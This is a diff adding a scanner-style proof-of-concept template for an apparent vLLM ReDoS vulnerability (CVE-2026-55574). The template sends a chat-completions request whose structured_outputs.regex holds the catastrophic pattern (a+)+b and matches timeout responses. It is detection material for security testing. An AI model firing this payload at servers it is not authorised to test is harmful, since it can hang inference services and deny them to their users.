@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "检测 vLLM structured_outputs.regex 参数 ReDoS 漏洞：发送包含嵌套量词 (a+)+b 的恶意正则表达式，验证服务是否因正则编译无超时而挂起"
+id = "POC-AVE-2026-0623"
+name = "CVE-2026-55574 PoC"
+severity = "high"
+tags = [
+    "cve-2026-55574",
+    "redos",
+    "vllm",
+]
+vuln_id = [
+    "CVE-2026-55574",
+    "GHSA-rwxx-mrjm-wc2m",
+    "AVE-2026-0623",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/v1/chat/completions"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"model":"default","messages":[{"role":"user","content":"hello"}],"structured_outputs":{"regex":"(a+)+b"}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "timed out",
+    "504",
+    "Gateway Timeout",
+]
